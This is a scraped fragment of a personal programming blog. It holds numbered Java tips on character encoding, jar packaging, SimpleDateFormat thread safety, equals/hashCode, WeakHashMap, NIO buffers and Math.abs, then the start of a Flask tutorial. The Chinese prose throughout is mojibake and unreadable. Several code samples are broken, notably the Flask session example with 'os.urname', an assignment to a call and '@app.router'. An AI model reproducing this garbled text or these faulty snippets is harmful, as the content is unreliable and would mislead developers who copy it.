FileReaderåœ¨ç±»å†…éƒ¨å®ç°è¿‡ç¨‹ä¸­ä¹Ÿæ˜¯åˆ©ç”¨äº†InputStreamReaderå®Œæˆå­—èŠ‚æµåˆ°å­—ç¬¦æµçš„è½¬åŒ–ï¼Œåªä¸è¿‡è½¬åŒ–æ—¶é‡‡ç”¨çš„å­—ç¬¦é›†ä¸ºç³»ç»Ÿé»˜è®¤çš„å­—ç¬¦é›†ã€‚å¦‚æœæ–‡ä»¶ä¿å­˜æ—¶çš„ç¼–ç è®¾å®šä¸ºUTF-8ï¼Œ é‚£ä¹ˆåœ¨ä¸­æ–‡æ“ä½œç³»ç»Ÿä½¿ç”¨ FileReaderæ—¶å°±ä¼šå‘ç”Ÿä¹±ç ï¼Œå› ä¸ºä¸­æ–‡æ“ä½œç³»ç»Ÿå¹³å°çš„é»˜è®¤å­—ç¬¦é›†ä¸ºGBKã€‚è§£å†³è¯¥é—®é¢˜çš„åŠæ³•æ˜¯ï¼Œæ”¾å¼ƒä½¿ç”¨FileReaderï¼Œæ”¹ç”¨InputStreamReaderï¼Œåœ¨è·å–InputStreamReaderå¯¹è±¡æ—¶ï¼Œæ˜¾ç¤ºæŒ‡å®šåˆé€‚çš„å­—ç¬¦é›†ã€‚ä»æºç æ¥çœ‹ï¼ŒFileReaderçš„readæ–¹æ³•ç›´æ¥è°ƒç”¨äº†InputStreamReaderçš„readæ–¹æ³•ï¼Œåœ¨æ²¡æœ‰ä¼ ç¼–ç è¿›æ¥çš„æƒ…å†µä¸‹ï¼ŒFileReader(InputStreamReader)ç›´æ¥ç”¨æ“ä½œç³»ç»Ÿé»˜è®¤ç¼–ç (GBK)å»è§£ç ä¸€ä¸ªUTF-8çš„æ–‡ä»¶ï¼Œå½“ç„¶ä¼šæœ‰æŸå¤±ã€‚The constructors of FileReader always use the platform default encoding which is generally a bad idea.ã€‚ æˆ–è€…ï¼Œåœ¨notpadPLusä¸­æ–°å»ºä¸€ä¸ªtxtæ–‡ä»¶ï¼Œç¼–ç å­—ç¬¦é›†-&gt;ä¸­æ–‡-&gt;GB2312(simplified)ã€‚è¿™æ ·è¿™ä¸ªæ–‡ä»¶æœ¬èº«å°±æ˜¯GB2312ç¼–ç çš„ï¼Œé‚£ä¸ªFileReaderç”¨GBKå»è§£ç ï¼Œè‡ªç„¶ä¸ä¼šå­˜åœ¨æŸå¤±ï¼Œæ‹¿ç€è§£ç åçš„äºŒè¿›åˆ¶æµç»™System.outå»æ‰“å°è‚¯å®šæ²¡é—®é¢˜ã€‚æ‰€ä»¥ï¼Œç…§è¯´ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶(ç¼–ç æ˜¯é’ˆå¯¹å­—ç¬¦æ¥è¯´çš„ï¼ŒäºŒè¿›åˆ¶æ–‡ä»¶æ˜¯è§£ç ä¹‹åçš„ä¸œè¥¿)ï¼Œæƒ³çœ‹ç¼–ç æ ¼å¼çš„è¯ï¼Œç”¨Notepad++å°±å¥½äº†ã€‚windowsä¸‹å»ºè®®ä½¿ç”¨utf-8ä¸å¸¦BOMæ ¼å¼ã€‚å¾ˆæœ‰æ„æ€çš„æ˜¯æˆ‘åœ¨vs codeé‡Œé¢æŸ¥çœ‹è¿™ä¸ªGB2312çš„æ–‡æœ¬æ–‡ä»¶ï¼Œå…¨æ˜¯ä¹±ç ï¼Œç»™å½“æˆutf-8å¤„ç†äº†ã€‚ã€‚ã€‚ã€‚ 44 . ä¸»å‡½æ•°çš„å‚æ•°é¡ºä¾¿æä¸€ä¸‹ï¼Œä¸»å‡½æ•°é‡Œé¢çš„argsæ˜¯å¯ä»¥ç”¨çš„ public static void main(String[] args){ System.out.println(&quot;args[0] is&quot;+args[0]); System.out.println(&quot;args[1] is&quot;+args[1]); System.out.println(&quot;args[2] is&quot;+args[2]); } 45. æ‰“jaråŒ…(å‘½ä»¤è¡Œè¿˜æ˜¯ide) jar -cvf HelloWorld.jar HelloWorld.class #å°†HelloWorld.classæ–‡ä»¶æ‰“å…¥jaråŒ…jar cvf xxx.jar ./ æ‰“å½“å‰æ‰€æœ‰çš„classjar cvfm xxx.jar ./META-INF/MANIFEST.MF ./ ##ä¿®æ”¹jaråŒ…ï¼Œä½¿ç”¨åŸæœ‰çš„manifestæ–‡ä»¶ åˆ›å»ºä¸€ä¸ªjaråŒ…å¯ä»¥ä½¿ç”¨å‘½ä»¤è¡Œï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨mavenå¦‚æœæƒ³è¦è®©è¿™ä¸ªjaræ–‡ä»¶å˜æˆå¯æ‰§è¡Œçš„ï¼Œéœ€è¦æ·»åŠ ä¸€ä¸ªManifest.txtæ–‡ä»¶,åœ¨é‡Œé¢åŒ…å«Main-Classå†…å®¹stackoverflowçš„è§£é‡Š] åˆ›å»ºä¸€ä¸ªå¯æ‰§è¡Œçš„jaråŒ…First.java import javax.swing.*; public class First{ First(){ JFrame f=new JFrame(); JButton b=new JButton(&quot;click&quot;); b.setBounds(130,100,100, 40); f.add(b); f.setSize(300,400); f.setLayout(null); f.setVisible(true); f.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE); } public static void main(String[] args) { new First(); } } myfile.mf Main-Class: First æ³¨æ„åœ¨classNameåé¢å¿…é¡»æœ‰ä¸€ä¸ªæ¢è¡Œï¼ˆIn mf file, new line is must after the class name.ï¼‰ javac First.javajar -cvmf myfile.mf myjar.jar First.classjava -jar myjar.jar ## å³å¯è¿è¡Œ intelij ideaæ‰“jaråŒ…æ›´ç®€å• 46. DateFormats are not thread-safeï¼Œå¤šçº¿ç¨‹ä¸‹ä¸å®‰å…¨stackoverFlowä¸Šæœ‰äººè¯´DateFormatæœ¬èº«ä¸æ˜¯çº¿ç¨‹å®‰å…¨çš„ï¼Œç®€å•æ¥è¯´å°±æ˜¯å¤šæ¡çº¿ç¨‹è°ƒç”¨DateFormatçš„formatæ–¹æ³•ï¼Œå¾—åˆ°çš„Stringç»“æœ æœ‰å¯èƒ½ æ˜¯é”™çš„ã€‚ public class Test{ private SimpleDateFormat dateFormat ; public static void main(String[] args) { SimpleDateFormat dateFormat= new SimpleDateFormat(&quot;yyyy-MM-dd&quot;); Date today = new Date(); Date tomorrow = new Date(today.getTime()+1000*60*60*24); System.out.println(today); // ä»Šå¤©æ˜¯2010-01-11 System.out.println(tomorrow); // æ˜å¤©æ˜¯2010-01-11 Thread thread1 = new Thread(new Thread1(dateFormat,today)); thread1.start(); Thread thread2 = new Thread(new Thread2(dateFormat,tomorrow)); thread2.start(); } } class Thread1 implements Runnable{ private SimpleDateFormat dateFormat; private Date date; public Thread1(SimpleDateFormat dateFormat,Date date){ this.dateFormat = dateFormat; this.date = date; } public void run() { for(;;){// ä¸€ç›´å¾ªç¯åˆ°å‡ºé—®é¢˜ä¸ºæ­¢å§ã€‚ String strDate = dateFormat.format(date); // å¦‚æœä¸ç­‰äº2018-03-19ï¼Œè¯æ˜å‡ºç°çº¿ç¨‹å®‰å…¨é—®é¢˜äº†ï¼ï¼ï¼ï¼ if(!&quot;2018-03-19&quot;.equals(strDate)){ System.err.println(&quot;format å‡ºæ¥çš„ today=&quot;+strDate); System.exit(-1); } } } } class Thread2 implements Runnable{ private SimpleDateFormat dateFormat; private Date date; public Thread2(SimpleDateFormat dateFormat,Date date){ this.dateFormat = dateFormat; this.date = date; } public void run() { for(;;){ String strDate = dateFormat.format(date); if(!&quot;2018-03-20&quot;.equals(strDate)){ System.err.println(&quot;format å‡ºæ¥çš„ tomorrow=&quot;+strDate); System.exit(-1); } } } } ä¸€èˆ¬æ¥è¯´çš„è§£å†³æ–¹æ¡ˆæ˜¯ç”¨ThreadLocalï¼Œæ¯æ¡çº¿ç¨‹éƒ½ä¿ç•™ä¸€ä»½å¤‡ä»½ï¼Œå°±ä¸ä¼šå‡ºé—®é¢˜äº† 47. equals()æ–¹æ³•è¢«overrideæ—¶ï¼ŒhashCode()ä¹Ÿè¦è¢«overrideç°è±¡å°±æ˜¯å¦‚æœä¸¤ä¸ªä¸šåŠ¡ä¸Šåº”è¯¥ç›¸åŒçš„object public class EqualsTest { public static void main(String[] args) { Employee e1 = new Employee(); Employee e2 = new Employee(); e1.setId(100); e2.setId(100); //Prints false in console System.out.println(e1.equals(e2)); //å¦‚æœä¸šåŠ¡ä¸Šè¦æ±‚å…·æœ‰ç›¸åŒidçš„ç”¨æˆ·è§†ä¸ºåŒä¸€ä¸ªç”¨æˆ·ï¼Œéœ€è¦å¤å†™equals Set&lt;Employee&gt; employees = new HashSet&lt;Employee&gt;(); employees.add(e1); employees.add(e2); //Prints two objects System.out.println(employees); //ä½†æ­¤æ—¶åªåº”è¯¥æ‰“å°å‡ºä¸€ä¸ªobjectï¼Œå› ä¸ºäºŒè€…åœ¨ä¸šåŠ¡ä¸Šåº”è¯¥è§†ä¸ºåŒä¸€ä¸ªå¯¹è±¡å¤„ç†ï¼Œä¹Ÿå°±è¿åäº†HashSetä¸èƒ½å­˜å‚¨é‡å¤å…ƒç´ çš„åŸåˆ™ã€‚ } } //åœ¨HashMapçš„getNodeæ–¹æ³• do { if (e.hash == hash &amp;&amp; ((k = e.key) == key || (key != null &amp;&amp; key.equals(k)))) return e; } while ((e = e.next) != null); //ä¼˜å…ˆæ ¹æ®hashCodeå»è·å– HashMap åº•å±‚é‡‡ç”¨ä¸€ä¸ª Entry[] æ•°ç»„æ¥ä¿å­˜æ‰€æœ‰çš„ key-value å¯¹ï¼Œå½“éœ€è¦å­˜å‚¨ä¸€ä¸ª Entry å¯¹è±¡æ—¶ï¼Œä¼šæ ¹æ®hashç®—æ³•æ¥å†³å®šå…¶åœ¨æ•°ç»„ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œåœ¨æ ¹æ®equalsæ–¹æ³•å†³å®šå…¶åœ¨è¯¥æ•°ç»„ä½ç½®ä¸Šçš„é“¾è¡¨ä¸­çš„å­˜å‚¨ä½ç½®ï¼›å½“éœ€è¦å–å‡ºä¸€ä¸ªEntryæ—¶ï¼Œä¹Ÿä¼šæ ¹æ®hashç®—æ³•æ‰¾åˆ°å…¶åœ¨æ•°ç»„ä¸­çš„å­˜å‚¨ä½ç½®ï¼Œå†æ ¹æ®equalsæ–¹æ³•ä»è¯¥ä½ç½®ä¸Šçš„é“¾è¡¨ä¸­å–å‡ºè¯¥Entryã€‚ é‚£ä¹ˆå¤å†™äº†hashCodeä¹‹åï¼Œä¸€å®šè¦å¤å†™equalsæ–¹æ³•å—ã€‚ 49. WeakHashmapè¿˜æ˜¯LeakHashmapAn entry in a &lt;tt&gt;WeakHashMap&lt;/tt&gt; will automatically be removed when * its key is no longer in ordinary use. More precisely, the presence of a * mapping for a given key will not prevent the key from being discarded by the * garbage collector, that is, made finalizable, finalized, and then reclaimed. * When a key has been discarded its entry is effectively removed from the map, * so this class behaves somewhat differently from other &lt;tt&gt;Map&lt;/tt&gt; * implementations. weakHashmapä¸­çš„Entryé•¿è¿™æ ·ï¼š private static class Entry&lt;K,V&gt; extends WeakReference&lt;Object&gt; implements Map.Entry&lt;K,V&gt; { V value; final int hash; Entry&lt;K,V&gt; next; /** * Creates new entry. */ Entry(Object key, V value, ReferenceQueue&lt;Object&gt; queue, int hash, Entry&lt;K,V&gt; next) { super(key, queue); //å°±æ˜¯æŠŠkeyä½œä¸ºweakReferenceåŒ…è£…èµ·æ¥äº† this.value = value; this.hash = hash; this.next = next; } } å¤šæ•°çš„è¯´æ³•éƒ½æ˜¯weakHashMapæŒæœ‰keyçš„å¼±å¼•ç”¨ï¼Œvalueçš„å¼ºå¼•ç”¨å…³äºstringä½œä¸ºkeyå’Œå¸¸é‡æ± çš„é—®é¢˜è¿™é‡Œé¢è¿˜è°ˆåˆ°äº† String a = &quot;a&quot;+&quot;b&quot;; //åç¼–è¯‘åå‘ç°è¿™æ ·çš„ä»£ç ä¼šç›´æ¥è¢«ç¼–è¯‘å™¨ä¼˜åŒ–æˆ String a = &quot;ab&quot;; String b = new String(&quot;Something&quot;);//new String()æ–¹æ³•æå‡ºæ¥çš„Stringæ˜¯ä¸ä¼šæ”¾åˆ°å¸¸é‡æ± çš„ String c = b.intern(); //è¿™ä¹ˆå¹²å°±æŠŠSomethingè¿™ä¸ªStringä¸¢åˆ°å¸¸é‡æ± å»äº†ï¼Œæ°¸è¿œä¸ä¼šè¢«GC è°è¯´æ¯”è¾ƒstringå°±ä¸èƒ½ç”¨==äº†ï¼ŒJava å±‚åªè¦å­—ç¬¦ä¸²çš„å€¼ç›¸ç­‰é‚£ä¹ˆé€šè¿‡internè·å–åˆ°çš„ä¸€å®šæ˜¯åŒä¸€ä¸ªå¯¹è±¡ï¼Œä¹Ÿå°±æ˜¯æ‰€è°“çš„æ ‡å‡†å¯¹è±¡ã€‚ä¸‹é¢çš„ä»£ç å°±å¯ä»¥æ¯”è¾ƒä¸¤ä¸ªstringæ˜¯å¦(å†…å®¹ä¸Š)ç›¸åŒ String st = new String(&quot;hello world&quot;); String st2 = new String(&quot;hello world&quot;); System.out.println(st.intern() == st2.intern()); åœ¨ Java å±‚æœ‰ä¸¤ç§æ–¹å¼èƒ½å°†å­—ç¬¦ä¸²å¯¹è±¡åŠ å…¥åˆ°è¿è¡Œæ—¶å¸¸é‡æ± ä¸­ï¼š åœ¨ç¨‹åºä¸­ç›´æ¥ä½¿ç”¨åŒå¼•å·æ¥å£°æ˜å­—ç¬¦ä¸²å¯¹è±¡ï¼Œæ‰§è¡Œæ—¶è¯¥å¯¹è±¡ä¼šè¢«åŠ å…¥åˆ°å¸¸é‡æ± ã€‚æ¯”å¦‚ä¸‹é¢ï¼Œè¯¥ç±»è¢«ç¼–è¯‘æˆå­—èŠ‚ç ååœ¨è¿è¡Œæ—¶æœ‰ç›¸åº”çš„æŒ‡ä»¤ä¼šå°†å…¶æ·»åŠ åˆ°å¸¸é‡æ± ä¸­ã€‚ public class Test{ public static void main(String[] args){ String s = &quot;hello&quot;; } } å¦å¤–ä¸€ç§æ˜¯é€šè¿‡ String ç±»çš„internæ–¹æ³•ï¼Œå®ƒèƒ½æ£€æµ‹å¸¸é‡æ± ä¸­æ˜¯å¦å·²ç»æœ‰å½“å‰å­—ç¬¦ä¸²å­˜åœ¨ï¼Œå¦‚æœä¸å­˜åœ¨åˆ™å°†å…¶åŠ å…¥åˆ°å¸¸é‡æ± ä¸­ã€‚æ¯”å¦‚ä¸‹é¢ï¼Œ String s = new String(&quot;hello&quot;); s.intern(); Brian Goetzå†™è¿‡ä¸€ç¯‡å…³äºWeakHashmapçš„æ–‡ç«  50. ä½¿ç”¨ByteBufferè¿›è¡Œæ–‡ä»¶ioæ“ä½œè¿™ä¸ªå…¶å®è¦çœ‹ä½¿ç”¨åœºæ™¯ï¼Œæ¯”æ–¹è¯´æ–‡ä»¶å¤§å° import java.io.IOException; import java.io.RandomAccessFile; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; // å°æ–‡ä»¶ç›´æ¥è¯»å®Œ public class ReadFileWithFileSizeBuffer { public static void main(String args[]) { try { RandomAccessFile aFile = new RandomAccessFile( &quot;test.txt&quot;,&quot;r&quot;); FileChannel inChannel = aFile.getChannel(); long fileSize = inChannel.size(); ByteBuffer buffer = ByteBuffer.allocate((int) fileSize); inChannel.read(buffer); //buffer.rewind(); buffer.flip(); for (int i = 0; i &lt; fileSize; i++) { System.out.print((char) buffer.get()); } inChannel.close(); aFile.close(); } catch (IOException exc) { System.out.println(exc); System.exit(1); } } } import java.io.IOException; import java.io.RandomAccessFile; import java.nio.ByteBuffer; import java.nio.channels.FileChannel; // è¯»å–å¤§æ–‡ä»¶ public class ReadFileWithFixedSizeBuffer { public static void main(String[] args) throws IOException { RandomAccessFile aFile = new RandomAccessFile (&quot;test.txt&quot;, &quot;r&quot;); FileChannel inChannel = aFile.getChannel(); ByteBuffer buffer = ByteBuffer.allocate(1024); while(inChannel.read(buffer) &gt; 0) { buffer.flip(); for (int i = 0; i &lt; buffer.limit(); i++) { System.out.print((char) buffer.get()); } buffer.clear(); // do something with the data and clear/compact it. } inChannel.close(); aFile.close(); } } //æ›´å¿«çš„å¤åˆ¶æ–‡ä»¶ï¼Œå…¶å®å°±æ˜¯mmapï¼Œåº•å±‚ä¹Ÿæ˜¯é€šè¿‡cè¯­è¨€èµ°äº†mmapçš„ç³»ç»Ÿè°ƒç”¨ import java.io.IOException; import java.io.RandomAccessFile; import java.nio.MappedByteBuffer; import java.nio.channels.FileChannel; public class ReadFileWithMappedByteBuffer { public static void main(String[] args) throws IOException { RandomAccessFile aFile = new RandomAccessFile (&quot;test.txt&quot;, &quot;r&quot;); FileChannel inChannel = aFile.getChannel(); MappedByteBuffer buffer = inChannel.map(FileChannel.MapMode.READ_ONLY, 0, inChannel.size()); buffer.load(); for (int i = 0; i &lt; buffer.limit(); i++) { System.out.print((char) buffer.get()); } buffer.clear(); // do something with the data and clear/compact it. inChannel.close(); aFile.close(); } } 51. ä¸¥é˜²Math.absè¿”å›è´Ÿæ•°Math.absä¼šè¿”å›è´Ÿæ•°æ˜¯ä¸€ä¸ªå¾ˆæœ‰åçš„å‘ï¼Œè¿™ä¸ªåªæœ‰åœ¨Integer.MIN_VALUEæˆ–è€…Long.MIN_VALUEçš„æ—¶å€™ä¼šå‘ç”Ÿ System.out.println(&quot;Integer is &quot; + Math.abs(Integer.MIN_VALUE)); System.out.println(&quot;Long is &quot; + Math.abs(Long.MIN_VALUE)); System.out.println(&quot;Byte is &quot; + Math.abs(Byte.MIN_VALUE)); Integer is -2147483648Long is -9223372036854775808Byte is 128åŸå› æ˜¯Integer.MIN_VALUE = -2^31Integer.MAX_VALUE = 2^31-1æ‰€ä»¥MIN_VALUEæ‰¾ä¸åˆ°å¯¹åº”çš„æ­£æ•° 52. rt.jaræ˜¯java runtimeçš„æ„æ€rt.jar contains all of the compiled class files for the base Java Runtime environment. You should not be messing with this jar file.è¯´å®ƒé‡è¦æ˜¯å› ä¸ºå‡ ä¹æ‰€æœ‰çš„javaç¨‹åºè¿è¡Œèµ·æ¥éƒ½æ˜¯è¿™æ ·çš„ javac -source 1.7 -bootclasspath /usr/lib/jvm/java-7-oracle/jre/lib/rt.jar Main.java sunè¢«oracleæ”¶è´­åï¼Œrt.jarå±äºoracleå…¬å¸ï¼Œå¹¶æœªå¼€æºã€‚æœ‰æ—¶å€™éœ€è¦çœ‹jdkæºç çš„è¯ï¼Œå¯ä»¥å‚è€ƒç¤¾åŒºç»´æŠ¤çš„openjdkçš„æºç ,ä½†æ˜¯åƒä¸‡ä¸è¦ä¹±æ”¹ã€‚windowså¹³å°ä¸‹ï¼Œæƒ³åœ¨ideaä¸­çœ‹jdkæºç çš„è¯ï¼Œä¸‹è½½openjdkæºç (ä¸€ä¸ªzipæ–‡ä»¶)ï¼Œä¸‹è½½ä¸‹æ¥è§£å‹åˆ°ä»»æ„ä¸€ä¸ªæ–‡ä»¶å¤¹ã€‚åœ¨ideaé‡Œï¼ŒFile - Project structure - sdk - source pathï¼Œç‚¹å‡»åŠ å·ï¼Œé€‰æ‹©æ·»åŠ åˆšæ‰è§£å‹çš„æ–‡ä»¶å¤¹é‡Œå¤´çš„java-1.8.0-openjdk-1.8.0.212-1.b04.ojdkbuild.windows.x86_64/src.zipã€‚æ¥ä¸‹æ¥ï¼Œéšä¾¿æŸ¥æ‰¾ä¸€ä¸ªsun packageä¸‹é¢çš„æ–‡ä»¶ï¼Œæ¯”æ–¹è¯´sun.nio.ch.WindowsSelectorImplï¼Œè‡ªç„¶ä¼šè·³è½¬åˆ°å¯¹åº”çš„æ–‡ä»¶ä¸­ã€‚ 53. ä¸ºä»€ä¹ˆä¸€ä¸ªå†…éƒ¨ç±»çš„private fieldèƒ½å¤Ÿè¢«åŒ…è£¹å®ƒçš„å¤–éƒ¨ç±»è®¿é—®åˆ°ä¸ºä»€ä¹ˆä¸€ä¸ªå†…éƒ¨ç±»çš„private fieldèƒ½å¤Ÿè¢«åŒ…è£¹å®ƒçš„å¤–éƒ¨ç±»è®¿é—®åˆ°å› ä¸ºjavaæ ‡å‡†è¿™ä¹ˆè§„å®šçš„ã€‚ä¸ç®¡è¿™ä¸ªinner classæ˜¯ä¸æ˜¯staticçš„ã€‚ 54. classLoaderè¿˜èƒ½è¯»å–æ–‡ä»¶å¦‚ä½•è¯»å–ä¸€ä¸ªæ”¾åœ¨classpathä¸Šçš„æ–‡ä»¶å‡å¦‚ç›®å½•ç»“æ„æ˜¯è¿™æ ·çš„code dummy Test.classtxt SomeTextFile.txt package dummy; import java.io.*; public class Test { public static void main(String[] args) { InputStream stream = Test.class.getResourceAsStream(&quot;/SomeTextFile.txt&quot;); System.out.println(stream != null); stream = Test.class.getClassLoader().getResourceAsStream(&quot;SomeTextFile.txt&quot;); System.out.println(stream != null); } } java -classpath code:txt dummy.Test è¾“å‡ºï¼štruetrue æ‰€ä»¥ç»“è®ºå°±æ˜¯getResourceAsStreamå¯ä»¥ç”¨æ¥è¯»å–æ–‡ä»¶ï¼Œæ‰€ä»¥tomcatçš„srcæ–‡ä»¶å¤¹ä¸­é™¤äº†javaæ–‡ä»¶è¿˜æœ‰ä¸€å¤§å †å…¶ä»–çš„.xmlã€.properityæ–‡ä»¶ç­‰ç­‰ã€‚ 55. javaçš„arrayçš„é•¿åº¦æ˜¯ç”¨intè¡¨ç¤ºçš„ï¼Œè¿™ä¹Ÿå°±æ„å‘³ç€æœ€å¤š20äº¿å¤šä¸€ç‚¹æ‰€ä»¥åœ¨jdkä»£ç ä¸­åˆ°å¤„æ˜¯è¿™ç§é˜²ç€overflowçš„ä»£ç ï¼šæ¯”å¦‚ArrayListä¸­çš„å®¹é‡çš„ private static int hugeCapacity(int minCapacity) { if (minCapacity &lt; 0) // overflow throw new OutOfMemoryError(); // è¿™é‡Œå°±æ˜¯é˜²ç€é‚£ç§20äº¿å¤šä¸€ç‚¹çš„æƒ…å†µçš„ return (minCapacity &gt; MAX_ARRAY_SIZE) ? Integer.MAX_VALUE : MAX_ARRAY_SIZE; } è‡³äºä¸ºä»€ä¹ˆä¸èƒ½åˆ›å»ºä¸€ä¸ªlongä½œä¸ºé•¿åº¦çš„arrayï¼Œè¿™ä¸ªå±äºjvmçš„é—®é¢˜äº†ã€‚ 56. try , catch, finallyçš„ä¸€äº›ç‚¹finallyä¸€å®šä¼šæ‰§è¡Œï¼Œä½†å¯¹è¿”å›å€¼æœ‰å½±å“å— åŸç†æ˜¯ä»æŸ¥çœ‹å­—èŠ‚ç å¾—åˆ°çš„æœ€ç»ˆç»“è®º . Class.forNameâ€¦åœ¨Appå¯åŠ¨çš„æ—¶å€™åœ¨å¦å¤–ä¸€ä¸ªçº¿ç¨‹é‡Œé¢æå‰å»åŠ è½½è¿™ä¸ªclassï¼Œèƒ½å¤ŸåŠ å¿«é€Ÿåº¦å—ï¼Ÿ classçš„ç”Ÿå‘½å‘¨æœŸ circular dependencies in java , how to ?ç†è®ºä¸Šå¯ä»¥ç”¨Makefileæ¥ç¼–è¯‘è¿è¡Œjavaé¡¹ç›® åªæ˜¯å¾ˆå°‘æœ‰äººè¿™ä¹ˆå¹²RedisClient lettuceè¿™ä¹ˆå¹²äº† å‚è€ƒ Jake Wharton and Jesse Wilson - Death, Taxes, and HTTP Android Tech Talk: HTTP In A Hostile World nettyé‡Œé¢ä½¿ç”¨jvm inlineæå‡è¿è¡Œæ•ˆç‡çš„ä¸€ä¸ªissue åšå®¢å†…å®¹éå¸¸æ·±å…¥åå°„ä¸ºä»€ä¹ˆæ…¢ï¼Œæ…¢æˆä»€ä¹ˆæ ·äº†","tags":[{"name":"java","slug":"java","permalink":"https://haldir65.github.io/tags/java/"}]},{"title":"ä½¿ç”¨Pythonæ­å»ºæœ¬åœ°æœåŠ¡å™¨","date":"2017-06-15T23:56:26.000Z","path":"2017/06/15/2017-06-15-python-networks/","text":"å…³äºå¦‚ä½•ä½¿ç”¨Pythonæ­å»ºåå°çš„æ–¹æ³•å¾ˆå¤šï¼Œè¿™é‡Œåˆ—ä¸¾å‡ºä¸€äº›å®ä¾‹ã€‚ 1. The Flask WayPyCharmæœ€å¥½è£…Professionalçš„ï¼Œæ–¹ä¾¿å¾ˆå¤šï¼Œå¯ä»¥sshåˆ°linuxè¿œç¨‹æœåŠ¡å™¨,ç›´æ¥è¿œç¨‹å¼€å‘ï¼Œè°ƒè¯•ã€‚é™¤äº†è¿æ¥æœ‰ç‚¹æ…¢ï¼Œåˆ«çš„éƒ½å¥½ã€‚windowsç¯å¢ƒä¸‹å¾ˆå¤šåº“éƒ½è·‘ä¸èµ·æ¥ã€‚è¿˜æ˜¯ç”¨macæˆ–è€…ç›´æ¥linux desktop 1.1 Basics Flask is a very simple, but extremely flexible framework Flaskä½¿ç”¨Decoratorå¯¹è¯·æ±‚è¿›è¡Œå¤„ç† #!/usr/bin/python3 # -*- coding:utf8 -*- from flask import Flask from flask import request from flask import jsonify from flask import send_file ### create the flask object app = Flask(__name__) ### å¯¹äºGETè¯·æ±‚ï¼Œè·å¾—queryå‚æ•°çš„æ–¹å¼ &gt; http://127.0.0.1:12345/_search_user?user=111&amp;date=190 @app.route(&#39;/_search_user&#39;, methods=[&#39;GET&#39;]) def query_user_profile(): try: user = request.args.get(&#39;user&#39;,&#39;&#39;) date = request.args.get(&#39;date&#39;,&#39;&#39;) print(user) ## 111 print(date) ## 190 return &#39;every Thing Ok&#39; except KeyError as e: return &quot;missing required key&quot; ### å¤„ç†POSTè¯·æ±‚ï¼Œä»requestä¸­æ‹¿ä¸œè¥¿ï¼Œè¿”å›response @app.route(&#39;/&#39;, methods=[&#39;POST&#39;]) def handle_post(): uid = request.form[&#39;uid&#39;] # requets.formæ˜¯ä¸€ä¸ªlistï¼Œä»é‡Œé¢è·å–æƒ³è¡¨å•çš„å‚æ•° name = request.form[&#39;name&#39;] print(&#39;uid is %s ,name is %s &#39; % (uid, name)) return &#39;200 Ok, or whatever you like&#39; ä»requestä¸­è·å¾—jsonæ•°æ® @app.route(&#39;/api/add_message/&lt;uuid&gt;&#39;, methods=[&#39;GET&#39;, &#39;POST&#39;]) def add_message(uuid): content = request.get_json(silent=True) ##å‰ææ˜¯å®¢æˆ·ç«¯å‘æ¥çš„requestä¸­åŒ…å«&#39;Content-Type&#39; == &#39;application/json&#39;çš„header print content return uuid if __name__ == &#39;__main__&#39;: app.run(port=12345, debug=True) #è®¾ç½®ä¸ºTrueåï¼Œä¼šè‡ªåŠ¨æ£€æµ‹åˆ°æœåŠ¡ç«¯ä»£ç æ›´æ”¹å¹¶reloadï¼Œå‡ºé”™äº†ä¹Ÿä¼šç»™clientè¿”å›å®é™…çš„é”™è¯¯å †æ ˆï¼Œ ç”Ÿäº§ç¯å¢ƒä¸è¦æ‰“å¼€Debug ã€‚ from flask import request ##è¯»å–cookie @app.route(&#39;/&#39;) def index(): username = request.cookies.get(&#39;username&#39;) # use cookies.get(key) instead of cookies[key] to not get a # KeyError if the cookie is missing. from flask import make_response ##è®¾ç½®cookie @app.route(&#39;/&#39;) def index(): resp = make_response(render_template(...)) resp.set_cookie(&#39;username&#39;, &#39;the username&#39;) return resp ### è®¾ç½®header @app.errorhandler(404) def not_found(error): resp = make_response(render_template(&#39;error.html&#39;), 404) resp.headers[&#39;X-Something&#39;] = &#39;A value&#39; return resp # hosting static fileï¼Œimage,css,etc # æä¾›å›¾ç‰‡ä»€ä¹ˆçš„ @app.route(&#39;/_get_image&#39;, methods=[&#39;GET&#39;]) def get_image(): filename = &#39;static/image/b1.jpg&#39; fullpath = os.path.join(os.path.curdir, filename) return send_file(fullpath, mimetype=&#39;image/jpeg&#39;) æˆ‘è§‰å¾—Flaskçš„å®˜æ–¹Docå¯¹åˆå­¦è€…çš„å‹å¥½åº¦å‡ ä¹æ˜¯æ»¡åˆ† accessing-request-data cookies sessions static filesæ‰€æœ‰çš„é™æ€æ–‡ä»¶å¿…é¡»æ”¾åœ¨å½“å‰ç›®å½•ä¸‹çš„staticç›®å½•ä¸­ï¼Œé‡Œé¢å¯ä»¥å†åˆ›å»ºimageï¼Œcss,404.htmlç­‰æ–‡ä»¶å¦å¤–ï¼Œå¦‚æœè¦è°ƒè¯•æ¥å£çš„è¯ï¼Œç”¨Postmanå§ï¼Œæ¯”Fiddlerç®€å•ç‚¹è¿”å›responseçš„æ—¶å€™ä¸€å®šè¦æŒ‡æ˜mime-typeï¼Œæˆ–è€…content-typetext/htmlã€text/cssã€application/jsonä»€ä¹ˆçš„ï¼Œ 1.2 Flask BluePrintsæ­£å¸¸çš„å·¥ç¨‹éƒ½ä¼šå¸Œæœ›å°†ä¸šåŠ¡å¤„ç†é€»è¾‘å†™åœ¨ä¸åŒçš„moduleé‡Œé¢ï¼Œåœ¨flaské‡Œé¢è¿™ç§æ€æƒ³çš„å®ç°æ–¹å¼æ˜¯BluePrintã€‚ how-to-divide-flask-app-into-multiple-py-files 1.3 Flask + gevent æé«˜web æ¡†æ¶çš„æ€§èƒ½docs 1.4 Flask Session managementè¿™æ®µç¤ºä¾‹ä»£ç å±•ç¤ºäº†å¦‚ä½•ä¸ºè¯·æ±‚è®¾ç½®session from flask import Flask ,session import os app = Flask(__name__) app.secret_key = os.urname(24) @app.route(&#39;/&#39;) def index(): session(&#39;user&#39;) = &#39;Anthony&#39; return &#39;Index&#39; @app.route(&#39;/getsession&#39;) def getsession(): if &#39;user&#39; in session: return session[&#39;user&#39;] return &#39;not logged in!&#39; @app.router(&#39;/dropsession&#39;) def dropsession(): session.pop(&#39;user&#39;,None) return &#39;Dropped&#39; if __name__ == &#39;__main__&#39;: app.run(debug=True) Flaskå’ŒFlaskSqlAlCheMyçš„curdæ•™ç¨‹å¾ˆç®€å• 